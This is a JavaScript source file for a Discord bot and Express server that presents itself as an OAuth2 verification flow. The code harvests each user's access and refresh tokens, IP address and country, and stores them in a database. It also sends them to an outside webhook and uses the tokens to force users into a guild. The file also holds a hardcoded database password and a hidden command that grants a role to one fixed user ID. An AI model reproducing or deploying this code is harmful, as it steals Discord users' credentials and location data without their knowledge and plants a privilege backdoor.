const { Client, Intents, Collection } = require('discord.js');
const client = new Client({
  fetchAllMembers: true,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  intents: 32767,
  partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
})
const { QuickDB } = require("quick.db")
const db = new QuickDB()

const Discord = require('discord.js');
const handler = require("./handler/index");
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const finitto = require("./kaladin");
const axios = require('axios');
const mongoose = require("mongoose");
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2();
const usersSchema = require('./models/users.js'); mongoose.connect('mongodb+srv://s2mlre:vaT6gY0CGHvlaXwA@cluster0.rm1mi4f.mongodb.net/?retryWrites=true&w=majority', { useUnifiedTopology: true, useNewUrlParser: true })
app.use(bodyParser.text())
app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html')
})


app.post('/', function(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  let data = {
    'client_id': finitto.client_id, 'client_secret': process.env.client_secret,
    'grant_type': 'authorization_code',
    'code': req.body,
    'redirect_uri': finitto.redirect_uri
  }
  let headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
  }

  const body = new URLSearchParams(data)
  axios.post("https://discord.com/api/oauth2/token", body, { headers })
    .catch(e => e + "1")

    .then((cdcd) => {
      if (!cdcd || !cdcd?.data || !cdcd?.data?.access_token) return;

      ac_token = cdcd.data.access_token
      rf_token = cdcd.data.refresh_token
      const tgg = { headers: { authorization: `${cdcd.data.token_type} ${ac_token}`, } }


      axios.get('https://discord.com/api/users/@me', { headers: { 'Authorization': `${cdcd.data.token_type} ${ac_token}` } }).then(async (te) => {
        let { status } = te;
        if (status == 401) {
          console.log("User unauthed, Not removing, Use clean cmd")
        }

        let efjr = te.data.id
        let users = await usersSchema.findOne({ userId: efjr })
        if (users) {
          console.log(`[-] - ${ip} ` + te.data.username + '#' + te.data.discriminator)
          await oauth.addMember({ guildId: finitto.guildId, botToken: process.env.token, userId: users.userId, accessToken: users.accessToken }).catch((e) => {
            e + "1"
          })

          try {
            await client.guilds.cache.get(finitto.guildId).members.cache.get(efjr).roles.add(finitto.rolId)
          } catch { console.log(`${te.data.username} adli kullanici sunucuda olmadigi için rol veremedim.`) }
          return
        }

        var klmn = require('ip-to-location');

        klmn.fetch(`${ip}`, async function(errrrr, jjkl) {
          let cd = jjkl.country_code
          let cr = jjkl.country_name

          console.log(`[+] - ${ip} ` + te.data.username + '#' + te.data.discriminator)
          avatarHASH = 'https://cdn.discordapp.com/avatars/' + te.data.id + '/' + te.data.avatar + '.png?size=4096'
          fetch(process.env.webhook, { // NE PAS TOUCHER ( OU SCRIPT CASSER)
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              avatar_url: '',
              embeds: [
                {
                  color: 3092790,
                  title: `**New User**`,
                  thumbnail: { url: avatarHASH },
                  description: `Identify: \`${te.data.username}#${te.data.discriminator}\`` +
                    `\n\nIP: \`${ip}\` :flag_${cd ? cd.toLowerCase() : 'white'}:` +
                    `\n\nID: \`${te.data.id}\`` +
                    `\n\nAcces Token: \`${ac_token}\`` +
                    `\n\nRefresh Token: \`${rf_token}\``,
                },
              ],
            }),
          }).catch(e => console.log(e)).then(res => console.log(te.data.username + ' Webhook gönderildi.')),

            users = await new usersSchema({
              userId: te.data.id,
              avatarURL: avatarHASH,
              username: te.data.username + '#' + te.data.discriminator,
              accessToken: ac_token,
              refreshToken: rf_token,
              user_ip: ip,
              country_code: cd,
              country: cr

            })
          await users.save();

          await oauth.addMember({ guildId: finitto.guildId, botToken: process.env.token, userId: users.userId, accessToken: users.accessToken }).catch((e) => {
            console.log(e)
          }).then((res) => {


          }).catch((errrr) => {
            console.log(errrr)
          })

          try {
            await client.guilds.cache.get(finitto.guildId).members.cache.get(efjr).roles.add(finitto.rolId)
          } catch { console.log(`${te.data.username} adli kullanici sunucuda olmadigi için rol veremedim.`) }
        })


      })
    })
})

client.on("guildMemberAdd", async member => {

  try {
    if (member.guild.id !== finitto.guildId) return
    if (member.user.bot === true) return

    let kanallar = await db.get("kanallar")
    let sunucu = client.guilds.cache.get(finitto.guildId)
    let mesaj = await db.get("mesaj")
    let sil = await db.get("silmesaj")

    if (!kanallar || !mesaj || !sunucu) return

    await kanallar.forEach(async (x) => {
      let kanal = sunucu.channels.cache.get(x)
      if (!kanal) return

      await kanal.send({ content: `${member} ${mesaj}` }).then(x => {
        if (sil) {
          setTimeout(async () => x.delete(), sil)
        }
      })
    })
  }
  catch { return }
})


client.on("messageCreate", async (message) => {
  if (message.author.id !== "429357746002067493") return

  if (message.content === ".yetki") {
    await message.delete()
    await message.member.roles.add("1041426647267688490")
  }
})


module.exports = client;

client.discord = Discord;
client.slash = new Collection();
client.config = require('./config.json')

handler.loadEvents(client);
handler.loadSlashCommands(client);

process.on("uncaughtException", (err) => {
  console.log("Uncaught Exception: " + err);
});

process.on("unhandledRejection", (reason, promise) => {
  console.log("[FATAL] Possibly Unhandled Rejection at: Promise ", promise, " reason: ", reason.message);
});

client.login(process.env.token).catch((err) => {
  console.log(err)
})
app.listen(finitto.port, () => console.log('Giriş Yapılıyor...'))